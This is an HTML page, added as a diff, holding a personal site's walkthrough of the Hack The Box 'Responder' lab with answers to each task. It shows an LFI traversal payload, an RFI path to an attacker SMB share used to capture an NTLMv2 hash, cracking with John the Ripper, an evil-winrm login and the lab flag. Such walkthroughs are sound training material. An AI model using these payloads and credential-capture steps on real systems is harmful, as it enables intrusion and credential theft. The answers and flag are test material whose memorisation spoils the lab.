@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Responder — Hack The Box</title>
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="stylesheet" href="../styles.css">
+    <script src="../script.js" defer></script>
+</head>
+
+<body>
+
+<div id="mobile-menu-button">
+    &#9776; 
+</div>
+
+<div id="sidebar" class="sidebar">
+    <h2>~/home</h2>
+    <a href="../index.html">Home</a>
+    <a href="../about.html">About Me</a>
+    <a href="../projects.html">Projects</a>
+    <a href="../writeups.html" class="active">Write-Ups</a>
+    <a href="../contact.html">Contact</a>
+
+    <div class="social-icons">
+        <a href="https://www.linkedin.com/in/iustin-barbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/linkedin.svg" alt="LinkedIn">
+        </a>
+        <a href="https://github.com/IustinBarbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/github.svg" alt="GitHub">
+        </a>
+        <a href="https://tryhackme.com/p/Glitch21" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/tryhackme.svg" alt="TryHackMe">
+        </a>
+    </div>
+</div>
+
+<section id="writeup-container">
+    <div class="writeup-content">
+        <h1>Responder — Hack The Box</h1>
+
+        <h2>Task 1</h2>
+        <p>When visiting the web service using the IP address, what is the domain that we are being redirected to?</p>
+        <p><strong>Answer:</strong> unika.htb</p>
+
+        <p>In order to view the actual website, add <code>unika.htb</code> and the IP to the <code>/etc/hosts</code> file.</p>
+
+        <h2>Task 2</h2>
+        <p>Which scripting language is being used on the server to generate webpages?</p>
+        <p><strong>Answer:</strong> php</p>
+
+<pre><code>|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1</code></pre>
+
+        <h2>Task 3</h2>
+        <p>What is the name of the URL parameter which is used to load different language versions of the webpage?</p>
+        <p><strong>Answer:</strong> page</p>
+
+<pre><code>http://unika.htb/index.php?page=french.html</code></pre>
+
+        <h2>Task 4</h2>
+        <p>Which value for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability?</p>
+        <p><strong>Answer:</strong> ../../../../../../../../windows/system32/drivers/etc/hosts</p>
+
+        <h2>Task 5</h2>
+        <p>Which value for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability?</p>
+        <p><strong>Answer:</strong> //10.10.14.6/somefile</p>
+
+        <h2>Task 6</h2>
+        <p>What does NTLM stand for?</p>
+        <p><strong>Answer:</strong> New Technology LAN Manager</p>
+
+        <h2>Task 7</h2>
+        <p>Which flag do we use in the Responder utility to specify the network interface?</p>
+        <p><strong>Answer:</strong> -i</p>
+
+        <h2>Task 8</h2>
+        <p>What is the full name of the tool often referred to as "john"?</p>
+        <p><strong>Answer:</strong> John The Ripper</p>
+
+        <pre><code>[SMB] NTLMv2-SSP Client   : 10.129.54.103
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:b4d5959973cd3c30:EB5DCDAA9EAD84D1AA4C5AB06460DC94</code></pre>
+
+        <pre><code>$ echo <our_hash> > hash.txt
+
+$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
+badminton        (Administrator)</code></pre>
+
+        <h2>Task 9</h2>
+        <p>What is the password for the administrator user?</p>
+        <p><strong>Answer:</strong> badminton</p>
+
+        <pre><code>evil-winrm -i 10.129.54.103 -u administrator -p badminton</code></pre>
+
+        <h2>Task 10</h2>
+        <p>What TCP port does Windows Remote Management listen on?</p>
+        <p><strong>Answer:</strong> 5985</p>
+
+        <h2>Task 11</h2>
+        <p>On which user's desktop is the flag located?</p>
+
+<pre><code>C:\Users> dir
+
+Administrator
+mike
+Public
+
+C:\Users\mike\Desktop> type flag.txt
+ea81b7afddd03efaa0945333ed147fac</code></pre>
+
+        <p><strong>Answer:</strong> mike</p>
+
+    </div>
+</section>
+
+</body>
+</html>
